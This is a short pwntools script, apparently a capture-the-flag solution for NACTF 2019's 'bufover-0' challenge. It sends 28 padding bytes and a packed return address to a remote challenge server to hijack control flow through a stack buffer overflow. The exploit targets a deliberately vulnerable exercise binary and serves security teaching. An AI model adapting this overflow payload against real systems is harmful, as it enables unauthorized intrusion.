#!/usr/bin/env python

from pwn import *


# r = process("./bufover-0")
r = remote("shell.2019.nactf.com", 31475)

# pause()
r.recvuntil("Type something>")

payload = (
    "A" * 28 +
    p32(0x80491c2)
)
r.sendline(payload)
print(r.recvall())
r.close()
